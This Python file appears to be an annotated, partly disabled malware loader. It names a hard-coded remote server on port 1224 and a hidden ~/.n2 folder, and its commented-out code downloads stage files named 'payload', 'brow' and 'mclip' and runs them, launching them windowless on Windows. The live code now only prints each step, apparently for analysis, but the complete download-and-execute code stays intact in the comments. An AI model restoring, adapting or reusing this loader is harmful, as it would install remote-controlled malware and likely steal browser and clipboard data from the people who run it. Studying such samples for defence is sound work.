import base64,platform,os,subprocess,sys
# try:import requests
# except:subprocess.check_call([sys.executable, '-m', 'pip', 'install', 'requests']);import requests
import requests

sType = "3"
gType = "726"
os_name = platform.system()
home = os.path.expanduser("~")
#host1 = "10.10.51.212"
host1 = "45.89.53.59"
host2 = f'http://{host1}:1224'
n2_dir_path = os.path.join(home, ".n2")
n2_pay_path = n2_dir_path + "/pay"

def download_payload():
    print(f"================= START :: download_payload =================")
    if os.path.exists(n2_pay_path):
        try:os.remove(n2_pay_path)
        except OSError:return True
    try:
        if not os.path.exists(n2_dir_path):os.makedirs(n2_dir_path)
    except:pass

    print(f"1. path {n2_dir_path} created")
    destination_request = host2 + "/payload/" + sType + "/" + gType
    print(f"2. request: GET {destination_request}")
    print(f"3. put response content to {n2_pay_path}")

    # try:
    #     if os_name=="Darwin":
    #         # aa = requests.get(host2+"/payload1/"+sType+"/"+gType, allow_redirects=True)
    #         aa = requests.get(host2+"/payload/"+sType+"/"+gType, allow_redirects=True)
    #         with open(n2_pay_path, 'wb') as f:f.write(aa.content)
    #     else:
    #         aa = requests.get(host2+"/payload/"+sType+"/"+gType, allow_redirects=True)
    #         with open(n2_pay_path, 'wb') as f:f.write(aa.content)
    #     return True
    # except Exception as e:return False

res=download_payload()
print(f"4. execute: '{sys.executable} {n2_pay_path}'")
# if res:
#     if os_name=="Windows":subprocess.Popen([sys.executable, n2_pay_path], creationflags=subprocess.CREATE_NO_WINDOW | subprocess.CREATE_NEW_PROCESS_GROUP)
#     else:subprocess.Popen([sys.executable, n2_pay_path])
print(f"5. if {os_name} == Darwin, then sys.exit(-1)")
print(f"================= END :: download_payload =================")
if os_name=="Darwin":sys.exit(-1)

n2_pay_path = n2_dir_path + "/bow"

def download_browse():
    print(f"================= START :: download_browse =================")
    # if os.path.exists(n2_pay_path):
    #     try:os.remove(n2_pay_path)
    #     except OSError:return True
    # try:
    #     if not os.path.exists(n2_dir_path):os.makedirs(n2_dir_path)
    # except:pass
    print(f"1. create path {n2_pay_path}")
    
    destination_request = host2+"/brow/"+ sType +"/"+gType

    print(f"2. request: GET {destination_request}")
    print(f"3. put response content to {n2_pay_path}")

    # try:
    #     aa=requests.get(host2+"/brow/"+ sType +"/"+gType, allow_redirects=True)
    #     with open(n2_pay_path, 'wb') as f:f.write(aa.content)
    #     return True
    # except Exception as e:return False

res=download_browse()

print(f"4. execute: {sys.executable} {n2_pay_path}")
print(f"================= END :: download_payload =================")
# if res:
#     if os_name=="Windows":subprocess.Popen([sys.executable, n2_pay_path], creationflags=subprocess.CREATE_NO_WINDOW | subprocess.CREATE_NEW_PROCESS_GROUP)
#     else:subprocess.Popen([sys.executable, n2_pay_path])

n2_pay_path = n2_dir_path + "/mlip"

def download_mclip():
    print(f"================= START :: download_mclip =================")

    # if os.path.exists(n2_pay_path):
    #     try:os.remove(n2_pay_path)
    #     except OSError:return True
    # try:
    #     if not os.path.exists(n2_dir_path):os.makedirs(n2_dir_path)
    # except:pass

    print(f"1. create path {n2_pay_path}")

    destination_request = host2+"/mclip/"+ sType +"/"+gType

    print(f"2. request: GET {destination_request}")
    print(f"3. put response to {n2_pay_path}")
    
    # try:
    #     aa=requests.get(host2+"/mclip/"+ sType +"/"+gType, allow_redirects=True)
    #     with open(n2_pay_path, 'wb') as f:f.write(aa.content)
    #     return True
    # except Exception as e:return False

res=download_mclip()

print(f"4. execute {sys.executable} {n2_pay_path}")
print(f"================= START :: download_mclip =================")

# if res:
#     if os_name=="Windows":subprocess.Popen([sys.executable, n2_pay_path], creationflags=subprocess.CREATE_NO_WINDOW | subprocess.CREATE_NEW_PROCESS_GROUP)
#     else:subprocess.Popen([sys.executable, n2_pay_path])
